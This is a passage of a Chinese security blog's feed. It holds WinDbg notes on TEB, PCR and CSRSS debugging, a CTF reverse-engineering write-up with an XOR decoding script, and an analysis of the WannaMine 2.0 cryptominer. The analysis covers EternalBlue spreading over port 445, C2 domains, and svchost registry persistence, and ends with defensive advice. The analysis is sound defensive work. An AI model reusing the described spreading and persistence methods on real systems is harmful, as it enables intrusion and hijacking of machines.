38和!teb查看的FS指向的TEB结构的基地址都是相同的。<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span><span class="string">:009&gt;</span> <span class="string">dg</span> <span class="number">38</span></div><div class="line">                                  <span class="string">P</span> <span class="string">Si</span> <span class="string">Gr</span> <span class="string">Pr</span> <span class="string">Lo</span></div><div class="line"><span class="string">Sel</span>    <span class="string">Base</span>     <span class="string">Limit</span>     <span class="string">Type</span>    <span class="string">l</span> <span class="string">ze</span> <span class="string">an</span> <span class="string">es</span> <span class="string">ng</span> <span class="string">Flags</span></div><div class="line"><span class="bullet">-</span><span class="meta">---</span> <span class="bullet">--------</span> <span class="bullet">--------</span> <span class="bullet">----------</span> <span class="bullet">-</span> <span class="bullet">--</span> <span class="bullet">--</span> <span class="bullet">--</span> <span class="bullet">--</span> <span class="bullet">--------</span></div><div class="line"><span class="number">0038</span> <span class="number">7</span><span class="string">ffd5000</span> <span class="number">00000</span><span class="string">fff</span> <span class="string">Data</span> <span class="string">RW</span> <span class="string">Ac</span> <span class="number">3</span> <span class="string">Bg</span> <span class="string">By</span> <span class="string">P</span>  <span class="string">Nl</span> <span class="number">000004</span><span class="string">f3</span></div><div class="line"><span class="number">0</span><span class="string">:009&gt;</span> <span class="string">!teb</span></div><div class="line"><span class="string">TEB</span> <span class="string">at</span> <span class="number">7</span><span class="string">ffd5000</span></div><div class="line"><span class="attr">    ExceptionList:</span>        <span class="number">02</span><span class="string">eaffe4</span></div><div class="line"><span class="attr">    StackBase:</span>            <span class="number">02</span><span class="string">eb0000</span></div><div class="line"><span class="attr">    StackLimit:</span>           <span class="number">02</span><span class="string">eaf000</span></div><div class="line"><span class="attr">    SubSystemTib:</span>         <span class="number">00000000</span></div><div class="line"><span class="attr">    FiberData:</span>            <span class="number">00001e00</span></div><div class="line"><span class="attr">    ArbitraryUserPointer:</span> <span class="number">00000000</span></div><div class="line"><span class="attr">    Self:</span>                 <span class="number">7</span><span class="string">ffd5000</span></div><div class="line"><span class="attr">    EnvironmentPointer:</span>   <span class="number">00000000</span></div><div class="line"><span class="attr">    ClientId:</span>             <span class="number">000001</span><span class="string">b8</span> <span class="string">.</span> <span class="number">00000</span><span class="string">ae4</span></div><div class="line"><span class="attr">    RpcHandle:</span>            <span class="number">00000000</span></div><div class="line">    <span class="string">Tls</span> <span class="attr">Storage:</span>          <span class="number">00000000</span></div><div class="line">    <span class="string">PEB</span> <span class="attr">Address:</span>          <span class="number">7</span><span class="string">ffdf000</span></div><div class="line"><span class="attr">    LastErrorValue:</span>       <span class="number">0</span></div><div class="line"><span class="attr">    LastStatusValue:</span>      <span class="number">0</span></div><div class="line">    <span class="string">Count</span> <span class="string">Owned</span> <span class="attr">Locks:</span>    <span class="number">0</span></div><div class="line"><span class="attr">    HardErrorMode:</span>        <span class="number">0</span></div></pre></td></tr></table></figure></p><h2 id="我是谁？"><a href="#我是谁？" class="headerlink" title="我是谁？"></a>我是谁？</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PCR处理器控制区是用于存放CPU的编号，IDT和GDT表和重要状态的内存区域，使用<code>!pcr命令</code>可以查看信息<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="string">kd&gt;</span> <span class="string">!pcr</span></div><div class="line"><span class="string">KPCR</span> <span class="string">for</span> <span class="string">Processor</span> <span class="number">0</span> <span class="string">at</span> <span class="attr">ffdff000:</span></div><div class="line">    <span class="string">Major</span> <span class="number">1</span> <span class="string">Minor</span> <span class="number">1</span></div><div class="line"><span class="string">NtTib.ExceptionList:</span> <span class="number">8054</span><span class="string">a4b0</span></div><div class="line">    <span class="string">NtTib.StackBase:</span> <span class="number">8054</span><span class="string">acf0</span></div><div class="line">   <span class="string">NtTib.StackLimit:</span> <span class="number">80547</span><span class="string">f00</span></div><div class="line"> <span class="string">NtTib.SubSystemTib:</span> <span class="number">00000000</span></div><div class="line">      <span class="string">NtTib.Version:</span> <span class="number">00000000</span></div><div class="line">  <span class="string">NtTib.UserPointer:</span> <span class="number">00000000</span></div><div class="line">      <span class="string">NtTib.SelfTib:</span> <span class="number">00000000</span></div><div class="line"></div><div class="line">            <span class="attr">SelfPcr:</span> <span class="string">ffdff000</span></div><div class="line">               <span class="attr">Prcb:</span> <span class="string">ffdff120</span></div><div class="line">               <span class="attr">Irql:</span> <span class="number">00000000</span></div><div class="line">                <span class="attr">IRR:</span> <span class="number">00000000</span></div><div class="line">                <span class="attr">IDR:</span> <span class="string">ffffffff</span></div><div class="line">      <span class="attr">InterruptMode:</span> <span class="number">00000000</span></div><div class="line">                <span class="attr">IDT:</span> <span class="number">8003</span><span class="string">f400</span></div><div class="line">                <span class="attr">GDT:</span> <span class="number">8003</span><span class="string">f000</span></div><div class="line">                <span class="attr">TSS:</span> <span class="number">80042000</span></div><div class="line"></div><div class="line">      <span class="attr">CurrentThread:</span> <span class="number">80553740</span></div><div class="line">         <span class="attr">NextThread:</span> <span class="number">00000000</span></div><div class="line">         <span class="attr">IdleThread:</span> <span class="number">80553740</span></div><div class="line"></div><div class="line">          <span class="attr">DpcQueue:</span>  <span class="number">0x80553da0</span> <span class="number">0x80500df0</span> <span class="string">[Normal]</span> <span class="string">nt!KiTimerExpiration</span></div><div class="line"><span class="string">kd&gt;</span> <span class="string">dg</span> <span class="number">30</span></div><div class="line">                                  <span class="string">P</span> <span class="string">Si</span> <span class="string">Gr</span> <span class="string">Pr</span> <span class="string">Lo</span></div><div class="line"><span class="string">Sel</span>    <span class="string">Base</span>     <span class="string">Limit</span>     <span class="string">Type</span>    <span class="string">l</span> <span class="string">ze</span> <span class="string">an</span> <span class="string">es</span> <span class="string">ng</span> <span class="string">Flags</span></div><div class="line"><span class="bullet">-</span><span class="meta">---</span> <span class="bullet">--------</span> <span class="bullet">--------</span> <span class="bullet">----------</span> <span class="bullet">-</span> <span class="bullet">--</span> <span class="bullet">--</span> <span class="bullet">--</span> <span class="bullet">--</span> <span class="bullet">--------</span></div><div class="line"><span class="number">0030</span> <span class="string">ffdff000</span> <span class="number">00001</span><span class="string">fff</span> <span class="string">Data</span> <span class="string">RW</span> <span class="string">Ac</span> <span class="number">0</span> <span class="string">Bg</span> <span class="string">Pg</span> <span class="string">P</span>  <span class="string">Nl</span> <span class="number">00000</span><span class="string">c93</span></div></pre></td></tr></table></figure></p><h2 id="不可缺少的TSS段"><a href="#不可缺少的TSS段" class="headerlink" title="不可缺少的TSS段"></a>不可缺少的TSS段</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TSS段，用于存放一个任务的执行状态的段，一般的会给每个任务分配一个TSS段，便于进行任务的切换，但是，windows这样的操作系统只是创建少数的TSS段，例如KGDT_TSS,KGDT_DF_TSS和KGDT_NMI_TSS，但是后面两个TSS是处理双误和不可屏蔽中断的任务切换的，也就是说，CPU会根据这两个TSS进行任务切换，<strong>关于第一个TSS是所有线程共享的</strong>，它的内容是随着任务的切换而改变的，也就是说os在切换线程时候，并不跟换TSS，而是更新TSS的内容。</p><h2 id="拓展到64位"><a href="#拓展到64位" class="headerlink" title="拓展到64位"></a>拓展到64位</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;和x32相比，x64取消了硬件方式下的任务切换，对TSS结构发生了很大修改。但是硬件还是保留了自动切换栈的功能，新增了一个名为IST的域。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;引用栈上的变量&quot;&gt;&lt;a href=&quot;#引用栈上的变量&quot; class=&quot;headerlink&quot; title=&quot;引用栈上的变量&quot;&gt;&lt;/a&gt;引用栈上的变量&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;n
      
    
    </summary>
    
      <category term="&lt;格蠹汇编&gt;" scheme="http://yoursite.com/categories/%E6%A0%BC%E8%A0%B9%E6%B1%87%E7%BC%96/"/>
    
    
  </entry>
  
  <entry>
    <title>ISG_CTF_Re</title>
    <link href="http://yoursite.com/2018/09/03/ISG_CTF_Re/"/>
    <id>http://yoursite.com/2018/09/03/ISG_CTF_Re/</id>
    <published>2018-09-03T06:02:11.000Z</published>
    <updated>2018-09-03T08:07:39.889Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Junkcode"><a href="#Junkcode" class="headerlink" title="Junkcode"></a>Junkcode</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;linux可执行文件，进过查壳没有发现异常，通过看题目，猜测程序可能加花，利用IDA打开，发现程序果然加花，但是通过重定义数据类型发现这并不是传统的加花来进行混淆。<br><a id="more"></a><br>    <img src="https://i.imgur.com/fBNNPw7.png" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;之后利用动态调试一下，很快找到main函数。通过对比机器指令，发现动态和静态的指令不一样，断定这可能是smc代码。<br>    <img src="https://i.imgur.com/bZrStxu.png" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;现在问题集中在逆向check函数上了，但是无法F5，原因是没有创建函数的，创建完函数，然后F5一下。发现这是ptr1^input==ptr2,找到其他两个数组内容，就可以写脚本了。<br>    <img src="https://i.imgur.com/vuhR75k.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;脚本如下：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">int num1[<span class="number">23</span>]=&#123;<span class="number">0x96</span>,<span class="number">0x8B</span>,<span class="number">0xCA</span>,<span class="number">0xD8</span>,<span class="number">0x72</span>,<span class="number">0xF9</span>,<span class="number">0xE8</span>,<span class="number">0xC0</span>,</div><div class="line">            <span class="number">0xF7</span>,<span class="number">0x0D</span>,<span class="number">0x46</span>,<span class="number">0x40</span>,<span class="number">0x29</span>,<span class="number">0x42</span>,<span class="number">0xA2</span>,<span class="number">0x9F</span>,</div><div class="line">            <span class="number">0x3E</span>,<span class="number">0x2C</span>,<span class="number">0x34</span>,<span class="number">0x71</span>,<span class="number">0xB2</span>,<span class="number">0x9E</span>,<span class="number">0xDA</span>&#125;;</div><div class="line">    int num2[<span class="number">23</span>]=&#123;<span class="number">0xDF</span>,<span class="number">0xD8</span>,<span class="number">0x8D</span>,<span class="number">0xA3</span>,<span class="number">0x18</span>,<span class="number">0xAC</span>,<span class="number">0x86</span>,<span class="number">0x8B</span>,</div><div class="line">                  <span class="number">0xA8</span>,<span class="number">0x6E</span>,<span class="number">0x76</span>,<span class="number">0x24</span>,<span class="number">0x4C</span>,<span class="number">0x1D</span>,<span class="number">0xCC</span>,<span class="number">0xAF</span>,</div><div class="line">                  <span class="number">0x4A</span>,<span class="number">0x73</span>,<span class="number">0x5E</span>,<span class="number">0x24</span>,<span class="number">0xDC</span>,<span class="number">0xD5</span>,<span class="number">0xA7</span>&#125;;</div><div class="line">    for(int i=<span class="number">0</span>;i&lt;<span class="number">23</span>;i++)</div><div class="line">    printf(<span class="string">"%c"</span>,num1[i]^num2[i]);</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Junkcode&quot;&gt;&lt;a href=&quot;#Junkcode&quot; class=&quot;headerlink&quot; title=&quot;Junkcode&quot;&gt;&lt;/a&gt;Junkcode&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;linux可执行文件，进过查壳没有发现异常，通过看题目，猜测程序可能加花，利用IDA打开，发现程序果然加花，但是通过重定义数据类型发现这并不是传统的加花来进行混淆。&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>病毒分析技术_14_Wannamine2.0挖矿病毒</title>
    <link href="http://yoursite.com/2018/09/03/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF_14_Wannamine2.0%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/"/>
    <id>http://yoursite.com/2018/09/03/病毒分析技术_14_Wannamine2.0挖矿病毒/</id>
    <published>2018-09-03T02:45:11.000Z</published>
    <updated>2018-09-03T07:03:23.986Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Wannamine2.0是wannamine家族的变种。该家族特征是使用NSA泄露的eternalblue漏洞利用工具包+扫描传播模块+挖矿木马，一切未打ms17-010漏洞补丁的机器都将是其目标，对于网络中存在ms17-010漏洞的机器而言，它是不可忽视的安全威胁。该挖矿木马为了躲避杀毒软件查杀，特地将主控程序加密并放到资源EnrollCertXaml.dll中。样本通过MS17-010（永恒之蓝）漏洞进行传播，其漏洞利用模块是使用的NSA工具包eternalblue和doublepuls，即2017年影子经纪人所公开的NSA工具包，定时和C&amp;C进行连接接受命令和更新模块，主要目的为挖掘门罗币。<br><a id="more"></a></p><h1 id="一：目录"><a href="#一：目录" class="headerlink" title="一：目录"></a>一：目录</h1><ul><li>1.目录</li><li>2.样本信息</li><li>3.样本分析</li><li>4.防御手段</li></ul><h1 id="二：样本信息"><a href="#二：样本信息" class="headerlink" title="二：样本信息"></a>二：样本信息</h1><ul><li>1.样本名称：spoolsv.exe</li><li>2.样本md5:97911A1DA380F874393CF15982C6B1B9</li><li>3.是否加壳:无壳</li><li>4.编译语言：Microsoft Visual C++ v14 - 2015 - x64 </li><li>5.样本来源：客户受感染主机</li></ul><h1 id="三：样本分析"><a href="#三：样本分析" class="headerlink" title="三：样本分析"></a>三：样本分析</h1><h2 id="母体文件"><a href="#母体文件" class="headerlink" title="母体文件"></a>母体文件</h2><ul><li><p>首先，获取系统信息和进程线程ID，进行运算，产生标志，这一点和WanaCry一致。<br>   <img src="https://i.imgur.com/OwuUqlR.png" alt=""></p></li><li><p>接着初始化网络。创建一个名为{F5175396-40C2-0218-278D6EE}的互斥体。<br>   <img src="https://i.imgur.com/eyG1k84.png" alt=""></p></li><li><p>然后，程序创建了五个线程，分别执行查找指定文件，链接445端口，进行局域网内传播，获取主机名和同一网段内的其他主机IP验证是否可以通过445端口链接，开辟存储TCP表，从task.attendecr.com:80/task处读取文件到内存，访问读取error.ttemdecr:8080/log,或者scan.attendecr.80/status内容。<br>  <img src="https://i.imgur.com/6DvitaS.png" alt=""><br>  <img src="https://i.imgur.com/OytxI5G.png" alt=""><br>  <img src="https://i.imgur.com/g2cSqzU.png" alt=""></p></li><li><p>Thread_1:</p><ul><li>连接字符串，c:\windows\System32\EnrollCertXaml.dll，判断c:\windows\System32\EnrollCertXaml.dll是否存在，如果存在，则读取入内存，<br>  <img src="https://i.imgur.com/nOWPKlb.png" alt=""><br>  <img src="https://i.imgur.com/JiFiICc.png" alt=""></li><li>如果不存在，创建C:\Windows\SpeechsTracing\Crypt”目录，然后释放病毒文件到C:\Windows\SpeechsTracing\Misresoft<br>  <img src="https://i.imgur.com/gvYx8CL.png" alt=""></li><li>删除源目录<br>  <img src="https://i.imgur.com/uxrebIc.png" alt=""></li><li>拼接字符串，读取svchost的配置信息<br>  <img src="https://i.imgur.com/aEL6tTg.png" alt=""></li><li>释放x86.dll和x64.dll文件到C:\Windows\SpeechsTracing\Microsoft\中<br>  <img src="https://i.imgur.com/BI0IXv5.png" alt=""><br>  <img src="https://i.imgur.com/6NiGyPn.png" alt=""></li><li>根据上面的print函数(相当于赋值操作)，创建了两个进程，执行c:\windows\SpeechsTracing\Microsoft\svchost.exe操作，<br><img src="https://i.imgur.com/wrwmt34.png" alt=""><br><img src="https://i.imgur.com/xrvHhQh.png" alt=""></li><li>读取并写入stage1.txt，判断攻击是否成功<br><img src="https://i.imgur.com/D0Sp9zF.png" alt=""></li><li>然后，通过CreateProcessA函数启动spoolsv.exe安装后门程序，同时将这个行为特征记录在stage2.txt。<br><img src="https://i.imgur.com/15VjaNJ.png" alt=""></li><li>调用CreateThread，创建一个线程。</li></ul></li><li><p>Thread_2 </p><ul><li>遍历每个IP地址</li><li>创建线程，每创建64个线程，暂停500ms</li><li>连接445端口和63257端口，<br><img src="https://i.imgur.com/IGNYQF3.png" alt=""></li><li>进入关键区，将可以被利用的地址保存，<br> <img src="https://i.imgur.com/7a0LPlb.png" alt=""></li></ul></li><li><p>Thread_3</p><ul><li>获取用户名和主机名<br>  <img src="https://i.imgur.com/iEnpfMI.png" alt=""></li><li>如果不是本地回环，则将ip地址传入sub_14000C110，目的是交给线程2<br>  <img src="https://i.imgur.com/bbprcyn.png" alt=""></li></ul></li><li><p>Thread_4</p><ul><li>存放已经可以被利用的IP的Tcp表，<br><img src="https://i.imgur.com/VuhjwqR.png" alt=""></li></ul></li><li><p>Thread_5</p><ul><li>从task.attendecr.com:80/tasks读取文件到内存<br><img src="https://i.imgur.com/gz4PMKs.png" alt=""></li></ul></li><li><p>Thread_6</p><ul><li>从访问读取error.ttemdecr:8080/log,或者scan.attendecr.80/status处读取文件<br><img src="https://i.imgur.com/CgvqPUA.png" alt=""></li></ul></li></ul><h2 id="x86-dll-x64-dll"><a href="#x86-dll-x64-dll" class="headerlink" title="x86.dll(x64.dll)"></a>x86.dll(x64.dll)</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x64.dll和x86.dll针对不同的架构，但是其功能是相同的。所以为了篇幅期间只分析x86.dll。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以看到x86.dll有三个导出函数，分别是DllRegisterServer，DllUnregisterServer，DllEntryPoint，从名字上来看这只是只是注册服务和删除服务的导出函数。<br>     <img src="https://i.imgur.com/rFRuOYt.png" alt=""></p><ul><li>创建了互斥体名为{B3DD837C-473B}的互斥体<br>  <img src="https://i.imgur.com/EPRFnse.png" alt=""><br>  <img src="https://i.imgur.com/s965CXu.png" alt=""></li><li>初始化网络，创建了线程，主要用于释放病毒，这里释放的是关于上文所述的EnrollCertXaml.dll，然后解压<br>  <img src="https://i.imgur.com/e2PbBZS.png" alt=""><br>  <img src="https://i.imgur.com/kMxBpG7.png" alt=""></li><li>将恶意代码数据写入SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost中的netsvcs中，而svchost是用来加载成组服务的，netsvcs 是一组服务的集合，不是单个的服务，具体哪些服务在netsvcs里，由此我们可以知道，病毒写入此注册表的目的是为了启动服务。从而实现常驻。<br>   <img src="https://i.imgur.com/oH62LYi.png" alt=""></li><li>以c:\windows\System32\svchost.exe -k netsvcs参数创建服务。<br>   <img src="https://i.imgur.com/TZNBSJp.png" alt=""></li><li>设置服务的描述和文件信息，servicedll指向dll文件的路径。<br>   <img src="https://i.imgur.com/zAaDmZV.png" alt=""></li></ul><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于样本不全，无法对病毒的关键逻辑进行分析。</p><h1 id="四：防御手段"><a href="#四：防御手段" class="headerlink" title="四：防御手段"></a>四：防御手段</h1><h2 id="1-打ms17-010补丁"><a href="#1-打ms17-010补丁" class="headerlink" title="1.打ms17-010补丁"></a>1.打ms17-010补丁</h2><ul><li>官方补丁【注：补丁如果打不上原因kennel是补丁依赖，即安装此次的补丁需要前一个补丁的支持。】：<a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2017/ms17-010" target="_blank" rel="external">https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2017/ms17-010</a><br>  <img src="https://i.imgur.com/0sOu2UG.png" alt=""></li></ul><h2 id="2-封堵445端口"><a href="#2-封堵445端口" class="headerlink" title="2.封堵445端口"></a>2.封堵445端口</h2><ul><li>防火墙禁用445端口</li><li>组策略445端口</li><li>禁用SMB服务</li></ul><h2 id="3-安装安全软件"><a href="#3-安装安全软件" class="headerlink" title="3.安装安全软件"></a>3.安装安全软件</h2><ul><li>进过测试，国内大部分安全厂商具备查杀此类病毒的能力</li><li>建议：查杀时，最后隔离网络，避免交叉感染</li></ul><h2 id="4-如何判定是否安装补丁"><a href="#4-如何判定是否安装补丁" class="headerlink" title="4.如何判定是否安装补丁"></a>4.如何判定是否安装补丁</h2><ul><li>1）控制面板-程序和功能-卸载程序-补丁更新</li><li>2）cmd命令行-输入systeminfo</li><li>3）win+R 输入regedit，依次展开，查看注册表项：<br>HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\Currentversion\hotfix</li></ul><h2 id="5-安全意识"><a href="#5-安全意识" class="headerlink" title="5.安全意识"></a>5.安全意识</h2><ul><li>不下载、不运行未知来源的软件，不点开不明链接，要有网络安全防范意识。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Wannamine2.0是wannamine家族的变种。该家族特征是使用NSA泄露的eternalblue漏洞利用工具包+扫描传播模块+挖矿木马，一切未打ms17-010漏洞补丁的机器都将是其目标，对于网络中存在ms17-010漏洞的机器而言，它是不可忽视的安全威胁。该挖矿木马为了躲避杀毒软件查杀，特地将主控程序加密并放到资源EnrollCertXaml.dll中。样本通过MS17-010（永恒之蓝）漏洞进行传播，其漏洞利用模块是使用的NSA工具包eternalblue和doublepuls，即2017年影子经纪人所公开的NSA工具包，定时和C&amp;amp;C进行连接接受命令和更新模块，主要目的为挖掘门罗币。&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>&lt;格蠹汇编&gt;_第25章_如何调试窗口大总管</title>
    <link href="http://yoursite.com/2018/08/28/%E3%80%8A%E6%A0%BC%E8%A0%B9%E6%B1%87%E7%BC%96%E3%80%8B_%E7%AC%AC25%E7%AB%A0_%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E7%AA%97%E5%8F%A3%E5%A4%A7%E6%80%BB%E7%AE%A1/"/>
    <id>http://yoursite.com/2018/08/28/《格蠹汇编》_第25章_如何调试窗口大总管/</id>
    <published>2018-08-28T07:02:11.000Z</published>
    <updated>2018-08-29T01:25:00.579Z</updated>
    
    <content type="html"><![CDATA[<h2 id="神圣不可侵犯"><a href="#神圣不可侵犯" class="headerlink" title="神圣不可侵犯"></a>神圣不可侵犯</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CSRSS进程，中文全称是系统服务进程，他监管着系统中运行的所有windows进程和线程。在消息分发，桌面管理，终端登录，控制台管理，DOS虚拟机等方面起着重要作用。由于其重要性，调试CSRSS进程也是相当困难的<br><a id="more"></a></p><h2 id="特殊的调试方式"><a href="#特殊的调试方式" class="headerlink" title="特殊的调试方式"></a>特殊的调试方式</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;尽管很重要，但是windows依然给我调试CSRSS进程的可能性。一共需要进行两部分操作。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，需要修改windows全局标志来启用对CSRSS调试的支持，有两种方法修改全局标志，第一种是修改注册表<code>HKLM\SYSTEM\CurrentControlSet\Control\Session Manager</code>,将GlobalFlag的数值与0x20000或运算，并写入。第2种方法是在windbg目录执行gflags /r +20000，并在图形界面勾选“Enable debugging of Win32 Subsystem”.<br>    <img src="https://i.imgur.com/CYBqMhU.png" alt=""><br>    <img src="https://i.imgur.com/VqYoXI5.png" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来是使用所谓的双机调试。我们一般使用两台计算机调试CSRSS，被调试机器不需要接收用户输入，没有用户界面，可以运行在后台，可以使用<strong>NTSD</strong>，调试主机使用windbg，以<strong>内核调试</strong>方式连接到被调试机器。</p><h2 id="附加到CSRSS"><a href="#附加到CSRSS" class="headerlink" title="附加到CSRSS"></a>附加到CSRSS</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;搭建好双机调试的环境后，在启用内核调试环境后，利用命令行的形式进入windbg目录下，执行<code>NTSD --</code>,可以看到控制台没有任何提示，但是NTSD在后台运行。<br>     <img src="https://i.imgur.com/HmsJDkI.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后在调试主机，以内核调试下的双机调试打开windbg，发现windbg已经附加在了CSRSS，只是CSRSS并没有中断下来，有一个方法是利用F12中断，当存在有页面的程序是，按F12可以使其中断在调试器。但是这样也好复杂。<br>     <img src="https://i.imgur.com/VjVQLDw.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;windbg下有个小工具就是干这件事的，将控制台切换到windbg目录，并且查找CSRSS的PID，然后 执行<code>breakin PID</code>即可中断在调试器。<br>     <img src="https://i.imgur.com/AEwx9Cc.png" alt=""></p><h2 id="符号文件"><a href="#符号文件" class="headerlink" title="符号文件"></a>符号文件</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当windbg中断后，利用<code>lm</code>罗列所有模块或者使用<code>k</code>命令查看栈回溯的话可能会得到一个warning，这是因为我们没有加载符号信息，但是我们应该加载被调试系统的符号还是加载调试系统的符号信息呢？之前说过<strong>调试端的调试器用于人机接口，被调试端的调试器起到真正的调试功能</strong>，所以，应该加载<strong>被调试的端的符号信息</strong>，执行<code>.sympath c:\symbols1</code>,然后<code>.reload</code>即可。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有了符号信息后执行lm后显示模块信息，且没有warning<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">0:011&gt; lm</div><div class="line">lm</div><div class="line">start    end        module name</div><div class="line">4a680000 4a685000   csrss      (no symbols)           </div><div class="line">62c20000 62c29000   LPK        (pdb symbols)          c:<span class="symbol">\s</span>ymbols1<span class="symbol">\l</span>pk.pdb<span class="symbol">\4</span>B6570DF2CFF45AAB60E416993385EAC1<span class="symbol">\l</span>pk.pdb</div><div class="line">73fa0000 7400b000   USP10      (pdb symbols)          c:<span class="symbol">\s</span>ymbols1<span class="symbol">\u</span>sp10.pdb<span class="symbol">\0</span>F289BC0C9A94139BC1C31EDEDBF52311<span class="symbol">\u</span>sp10.pdb</div><div class="line">75aa0000 75aab000   CSRSRV     (export symbols)       C:<span class="symbol">\W</span>INDOWS<span class="symbol">\s</span>ystem32<span class="symbol">\C</span>SRSRV.dll</div><div class="line">75ab0000 75ac0000   basesrv    (export symbols)       C:<span class="symbol">\W</span>INDOWS<span class="symbol">\s</span>ystem32<span class="symbol">\b</span>asesrv.dll</div><div class="line">75e00000 75eae000   sxs        (export symbols)       C:<span class="symbol">\W</span>INDOWS<span class="symbol">\s</span>ystem32<span class="symbol">\s</span>xs.dll</div><div class="line">764e0000 76534000   winsrv     (export symbols)       C:<span class="symbol">\W</span>INDOWS<span class="symbol">\s</span>ystem32<span class="symbol">\w</span>insrv.dll</div><div class="line">77d10000 